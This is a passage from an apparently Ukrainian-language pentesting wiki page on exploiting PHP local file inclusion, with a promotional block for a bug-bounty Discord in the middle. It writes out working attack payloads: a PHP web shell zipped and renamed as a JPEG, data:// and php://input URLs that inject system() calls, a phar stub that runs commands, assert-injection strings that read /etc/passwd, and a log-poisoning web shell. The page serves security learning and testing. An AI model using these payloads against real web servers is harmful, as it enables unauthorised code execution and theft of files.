* –Ü –¥–ª—è —Ç–æ–≥–æ, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ **–¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–∞–Ω—ñ**, —ñ–¥–µ—è –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± **–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ 2 –±–∞–π—Ç–∏ –Ω–µ–ø–æ—Ç—Ä—ñ–±–Ω–∏—Ö –¥–∞–Ω–∏—Ö –Ω–∞ –ø–æ—á–∞—Ç–∫—É** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **convert.iconv.UTF16.UTF16**, –∑–∞—Å—Ç–æ—Å–æ–≤—É–≤–∞—Ç–∏ **UCS-4LE**, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ **–ø–æ–≤–æ—Ä–æ—Ç –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏–º–∏ 2 –±–∞–π—Ç–∞–º–∏**, —ñ **–≤–∏–¥–∞–ª—è—Ç–∏ –¥–∞–Ω—ñ –¥–æ –Ω–µ–ø–æ—Ç—Ä—ñ–±–Ω–∏—Ö –¥–∞–Ω–∏—Ö** (—Ü–µ –≤–∏–¥–∞–ª–∏—Ç—å –ø–µ—Ä—à—ñ 2 –±–∞–π—Ç–∏ –ø–æ—á–∞—Ç–∫–æ–≤–æ–≥–æ —Ç–µ–∫—Å—Ç—É). –ü—Ä–æ–¥–æ–≤–∂—É–π—Ç–µ —Ü–µ —Ä–æ–±–∏—Ç–∏, –ø–æ–∫–∏ –Ω–µ –¥–æ—Å—è–≥–Ω–µ—Ç–µ –±–∞–∂–∞–Ω–æ–≥–æ –±—ñ—Ç–∞ –¥–ª—è –≤–∏—Ç–æ–∫—É.

–£ –ø–æ—Å—Ç—ñ —Ç–∞–∫–æ–∂ –±—É–ª–æ —Ä–æ–∑–∫—Ä–∏—Ç–æ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü—å–æ–≥–æ: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit).

### php://fd

–¶–µ–π –æ–±–≥–æ—Ä—Ç–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–π–ª–æ–≤–∏—Ö –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—ñ–≤, —è–∫—ñ –≤—ñ–¥–∫—Ä–∏—Ç—ñ –ø—Ä–æ—Ü–µ—Å–æ–º. –ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è –≤–∏—Ç—ñ–∫–∞–Ω–Ω—è –≤–º—ñ—Å—Ç—É –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö —Ñ–∞–π–ª—ñ–≤:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **php://stdin, php://stdout —Ç–∞ php://stderr** –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ **–¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—ñ–≤ —Ñ–∞–π–ª—ñ–≤ 0, 1 —Ç–∞ 2** –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ (–Ω–µ –≤–ø–µ–≤–Ω–µ–Ω–∏–π, —è–∫ —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º —É –Ω–∞–ø–∞–¥—ñ)

### zip:// —Ç–∞ rar://

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ Zip –∞–±–æ Rar —Ñ–∞–π–ª –∑ PHPShell –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ç–∞ –æ—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø.\
–î–ª—è —Ç–æ–≥–æ, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–º rar, **–ø–æ—Ç—Ä—ñ–±–Ω–æ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

–¶–µ–π –ø—Ä–æ—Ç–æ–∫–æ–ª –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤ URL. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, `data://text/plain;base64,SGVsbG8sIFdvcmxkIQ==` –≤—ñ–¥–æ–±—Ä–∞–∑–∏—Ç—å "Hello, World!" –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ–π –ø—Ä–æ—Ç–æ–∫–æ–ª –æ–±–º–µ–∂—É—î—Ç—å—Å—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è–º–∏ php **`allow_url_open`** —Ç–∞ **`allow_url_include`**

### expect://

Expect –º–∞—î –±—É—Ç–∏ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∏–π. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü–µ:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### –≤–≤—ñ–¥://

–í–∫–∞–∂—ñ—Ç—å –≤–∞—à—É –ø–æ–ª–µ–∑–Ω—É –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞—Ö POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

–§–∞–π–ª `.phar` –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è PHP-–∫–æ–¥—É, –∫–æ–ª–∏ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ `include` –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤. –ù–∞–≤–µ–¥–µ–Ω–∏–π –Ω–∏–∂—á–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥—É PHP –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ–∞–π–ª—É `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
–î–ª—è –∫–æ–º–ø—ñ–ª—è—Ü—ñ—ó —Ñ–∞–π–ª—É `.phar` —Å–ª—ñ–¥ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É:
```bash
php --define phar.readonly=0 create_path.php
```
–ü—ñ—Å–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –±—É–¥–µ —Å—Ç–≤–æ—Ä–µ–Ω–æ —Ñ–∞–π–ª –∑ –Ω–∞–∑–≤–æ—é `test.phar`, —è–∫–∏–π –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ (LFI).

–£ –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ LFI –≤–∏–∫–æ–Ω—É—î –ª–∏—à–µ —á–∏—Ç–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ –±–µ–∑ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è PHP-–∫–æ–¥—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, –∞–±–æ `filesize()`, –º–æ–∂–Ω–∞ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó. –¶—è —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –ø–æ–≤'—è–∑–∞–Ω–∞ –∑ —á–∏—Ç–∞–Ω–Ω—è–º —Ñ–∞–π–ª—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–æ—Ç–æ–∫–æ–ª—É `phar`.

–î–ª—è –¥–æ–∫–ª–∞–¥–Ω–æ–≥–æ —Ä–æ–∑—É–º—ñ–Ω–Ω—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ —Ñ–∞–π–ª—ñ–≤ `.phar`, –¥–∏–≤. –¥–æ–∫—É–º–µ–Ω—Ç, –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ —è–∫–∏–π –Ω–∞–≤–µ–¥–µ–Ω–æ –Ω–∏–∂—á–µ:

[–ü–æ—Å—ñ–±–Ω–∏–∫ –∑ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó Phar](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### –ë—ñ–ª—å—à–µ –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –º–æ–∂–ª–∏–≤—ñ[ **–ø—Ä–æ—Ç–æ–∫–æ–ª–∏ –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è —Ç—É—Ç**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory —Ç–∞ php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî –ó–∞–ø–∏—Å —É –ø–∞–º'—è—Ç—ñ –∞–±–æ —É —Ç–∏–º—á–∞—Å–æ–≤–∏–π —Ñ–∞–π–ª (–Ω–µ –∑–æ–≤—Å—ñ–º –∑—Ä–æ–∑—É–º—ñ–ª–æ, —è–∫ —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º —É –∞—Ç–∞–∫–∞—Ö –Ω–∞ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî –î–æ—Å—Ç—É–ø –¥–æ –ª–æ–∫–∞–ª—å–Ω–æ—ó —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî –î–æ—Å—Ç—É–ø –¥–æ URL-–∞–¥—Ä–µ—Å HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî –î–æ—Å—Ç—É–ø –¥–æ URL-–∞–¥—Ä–µ—Å FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî –ü–æ—Ç–æ–∫–∏ —Å—Ç–∏—Å–Ω–µ–Ω–Ω—è
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî –ü–æ—à—É–∫ —à–ª—è—Ö—ñ–≤, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —à–∞–±–ª–æ–Ω—É (–Ω–µ –ø–æ–≤–µ—Ä—Ç–∞—î –Ω—ñ—á–æ–≥–æ –¥—Ä—É–∫–æ–≤–∞–Ω–æ–≥–æ, —Ç–æ–º—É –Ω–µ –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–æ —Ç—É—Ç)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî –ë–µ–∑–ø–µ—á–Ω–∏–π Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî –ê—É–¥—ñ–æ–ø–æ—Ç–æ–∫–∏ (–Ω–µ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤)

## LFI —á–µ—Ä–µ–∑ 'assert' PHP

–†–∏–∑–∏–∫–∏ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ (LFI) –≤ PHP –æ—Å–æ–±–ª–∏–≤–æ –≤–∏—Å–æ–∫—ñ –ø—Ä–∏ —Ä–æ–±–æ—Ç—ñ –∑ —Ñ—É–Ω–∫—Ü—ñ—î—é 'assert', —è–∫–∞ –º–æ–∂–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–¥ —É —Ä—è–¥–∫–∞—Ö. –¶–µ –æ—Å–æ–±–ª–∏–≤–æ –ø—Ä–æ–±–ª–µ–º–∞—Ç–∏—á–Ω–æ, —è–∫—â–æ –≤—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ, —â–æ –º—ñ—Å—Ç—è—Ç—å —Å–∏–º–≤–æ–ª–∏ —Ç—Ä–∞–≤–µ—Ä—Å—É–≤–∞–Ω–Ω—è –∫–∞—Ç–∞–ª–æ–≥—ñ–≤, —Ç–∞–∫—ñ —è–∫ "..", –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å—Å—è, –∞–ª–µ –Ω–µ –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º —Å–∞–Ω—ñ—Ç–∞—Ä–∏–∑–æ–≤–∞–Ω—ñ.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∫–æ–¥ PHP –º–æ–∂–µ –±—É—Ç–∏ —Ä–æ–∑—Ä–æ–±–ª–µ–Ω–∏–π –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è —Ç—Ä–∞–≤–µ—Ä—Å—É–≤–∞–Ω–Ω—é –∫–∞—Ç–∞–ª–æ–≥—ñ–≤ —Ç–∞–∫–∏–º —á–∏–Ω–æ–º:
```bash
assert("strpos('$file', '..') === false") or die("");
```
–•–æ—á–∞ —Ü–µ —Å–ø—Ä—è–º–æ–≤–∞–Ω–æ –Ω–∞ –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è —Ç—Ä–∞–Ω—Å–≤–µ—Ä—Å–∞–ª—É, —Ü–µ –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ —Å—Ç–≤–æ—Ä—é—î –≤–µ–∫—Ç–æ—Ä –¥–ª—è —ñ–Ω'—î–∫—Ü—ñ—ó –∫–æ–¥—É. –î–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—å–æ–≥–æ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –≤–º—ñ—Å—Ç—É —Ñ–∞–π–ª—É, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
–ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ, –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–Ω–∏—Ö –∫–æ–º–∞–Ω–¥ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```plaintext
' and die(system("id")) or '
```
–í–∞–∂–ª–∏–≤–æ **URL-–∫–æ–¥—É–≤–∞—Ç–∏ —Ü—ñ –≤–∞–Ω—Ç–∞–∂—ñ**.

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) —Å–µ—Ä–≤–µ—Ä–∞, —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ –º–∏—Å–ª–∏–≤—Ü—è–º–∏ –∑–∞ –±–∞–≥–∞–º–∏!

**–Ü–Ω—Å–∞–π—Ç–∏ —â–æ–¥–æ –•–∞–∫—ñ–Ω–≥—É**\
–í–∑–∞—î–º–æ–¥—ñ–π—Ç–µ –∑ –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º, —è–∫–∏–π –¥–æ—Å–ª—ñ–¥–∂—É—î –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ –ø—Ä–æ –•–∞–∫—ñ–Ω–≥ —É –†–µ–∞–ª—å–Ω–æ–º—É –ß–∞—Å—ñ**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ —à–≤–∏–¥–∫–æ–∑–º—ñ–Ω–Ω–æ–≥–æ —Å–≤—ñ—Ç—É —Ö–∞–∫—ñ–Ω–≥—É –∑–∞–≤–¥—è–∫–∏ –Ω–æ–≤–∏–Ω–∞–º —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∞–º —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –û–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–∞–π–Ω–æ–≤—ñ—à–∏—Ö –∑–∞–ø—É—Å–∫—ñ–≤ –±–∞–≥-–±–∞—É–Ω—Ç—ñ —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**Discord**](https://discord.com/invite/N3FrSbmwdy) —Ç–∞ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ —Ç–æ–ø–æ–≤–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

## PHP Blind Path Traversal

{% hint style="warning" %}
–¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –∞–∫—Ç—É–∞–ª—å–Ω–∞ —É –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ –≤–∏ **–∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç–µ** **—à–ª—è—Ö –¥–æ —Ñ–∞–π–ª—É** —Ñ—É–Ω–∫—Ü—ñ—ó **PHP**, —è–∫–∞ –±—É–¥–µ **–∑–≤–µ—Ä—Ç–∞—Ç–∏—Å—è –¥–æ —Ñ–∞–π–ª—É**, –∞–ª–µ –≤–∏ –Ω–µ –ø–æ–±–∞—á–∏—Ç–µ –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—Ä–æ—Å—Ç–∏–π –≤–∏–∫–ª–∏–∫ **`file()`**), –∞–ª–µ –≤–º—ñ—Å—Ç –Ω–µ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è.
{% endhint %}

–£ [**—Ü—å–æ–º—É –Ω–µ–π–º–æ–≤—ñ—Ä–Ω–æ–º—É –ø–æ—Å—Ç—ñ**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) –ø–æ—è—Å–Ω–µ–Ω–æ, —è–∫ —Å–ª—ñ–ø–∏–π –ø–µ—Ä–µ—Ö—ñ–¥ —à–ª—è—Ö—É –º–æ–∂–Ω–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —á–µ—Ä–µ–∑ —Ñ—ñ–ª—å—Ç—Ä PHP –¥–ª—è **–µ–∫—Å—Ç—Ä–∞–∫—Ü—ñ—ó –≤–º—ñ—Å—Ç—É —Ñ–∞–π–ª—É —á–µ—Ä–µ–∑ –ø–æ–º–∏–ª–∫–æ–≤–∏–π –æ—Ä–∞–∫—É–ª**.

–£ –ø—ñ–¥—Å—É–º–∫—É, —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –∫–æ–¥—É–≤–∞–Ω–Ω—è **"UCS-4LE"**, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É –Ω–∞—Å—Ç—ñ–ª—å–∫–∏ **–≤–µ–ª–∏–∫–∏–º**, —â–æ —Ñ—É–Ω–∫—Ü—ñ—è PHP, —è–∫–∞ –≤—ñ–¥–∫—Ä–∏–≤–∞—î —Ñ–∞–π–ª, —Å–ø—Ä–∏—á–∏–Ω–∏—Ç—å **–ø–æ–º–∏–ª–∫—É**.

–ü–æ—Ç—ñ–º, –¥–ª—è –≤–∏—Ç–æ–∫—É –ø–µ—Ä—à–æ–≥–æ —Å–∏–º–≤–æ–ª—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —Ñ—ñ–ª—å—Ç—Ä **`dechunk`** —Ä–∞–∑–æ–º –∑ —ñ–Ω—à–∏–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫ **base64** –∞–±–æ **rot13**, —ñ, –Ω–∞—Ä–µ—à—Ç—ñ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —Ñ—ñ–ª—å—Ç—Ä–∏ **convert.iconv.UCS-4.UCS-4LE** —Ç–∞ **convert.iconv.UTF16.UTF-16BE**, —â–æ–± **—Ä–æ–∑–º—ñ—Å—Ç–∏—Ç–∏ —ñ–Ω—à—ñ —Å–∏–º–≤–æ–ª–∏ –Ω–∞ –ø–æ—á–∞—Ç–∫—É —Ç–∞ –≤–∏—Ç—ñ–∫–∞—Ç–∏ —ó—Ö**.

**–§—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–∏–º–∏**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (—Ç—ñ–ª—å–∫–∏ —Ü—ñ–ª—å –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –∑ —Ü–∏–º)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

–î–ª—è —Ç–µ—Ö–Ω—ñ—á–Ω–∏—Ö –¥–µ—Ç–∞–ª–µ–π –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∑–≥–∞–¥–∞–Ω–∏–π –ø–æ—Å—Ç!

## LFI2RCE

### –í—ñ–¥–¥–∞–ª–µ–Ω–µ –í–∫–ª—é—á–µ–Ω–Ω—è –§–∞–π–ª—ñ–≤

–ü–æ—è—Å–Ω–µ–Ω–æ —Ä–∞–Ω—ñ—à–µ, [**—Å–ª—ñ–¥—É–π—Ç–µ –∑–∞ —Ü–∏–º –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º**](./#remote-file-inclusion).

### –ß–µ—Ä–µ–∑ —Ñ–∞–π–ª –∂—É—Ä–Ω–∞–ª—É Apache/Nginx

–Ø–∫—â–æ —Å–µ—Ä–≤–µ—Ä Apache –∞–±–æ Nginx **–≤—Ä–∞–∑–ª–∏–≤–∏–π –Ω–∞ LFI** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –≤–∫–ª—é—á–µ–Ω–Ω—è, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **`/var/log/apache2/access.log` –∞–±–æ `/var/log/nginx/access.log`**, –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **–∞–≥–µ–Ω—Ç–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –∞–±–æ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **GET –ø–∞—Ä–∞–º–µ—Ç—Ä–∞** php shell, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ **`<?php system($_GET['c']); ?>`** —Ç–∞ –≤–∫–ª—é—á–∏—Ç–∏ —Ü–µ–π —Ñ–∞–π–ª

{% hint style="warning" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **—è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ –ø–æ–¥–≤—ñ–π–Ω—ñ –ª–∞–ø–∫–∏** –¥–ª—è –æ–±–æ–ª–æ–Ω–∫–∏ –∑–∞–º—ñ—Å—Ç—å **–ø—Ä–æ—Å—Ç–∏—Ö –ª–∞–ø–æ–∫**, –ø–æ–¥–≤—ñ–π–Ω—ñ –ª–∞–ø–∫–∏ –±—É–¥—É—Ç—å –∑–º—ñ–Ω–µ–Ω—ñ –Ω–∞ —Ä—è–¥–æ–∫ "_**quote;**_", **PHP –≤–∏–∫–∏–Ω–µ –ø–æ–º–∏–ª–∫—É** —Ç—É—Ç —ñ **–Ω—ñ—á–æ–≥–æ —ñ–Ω—à–æ–≥–æ –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ**.

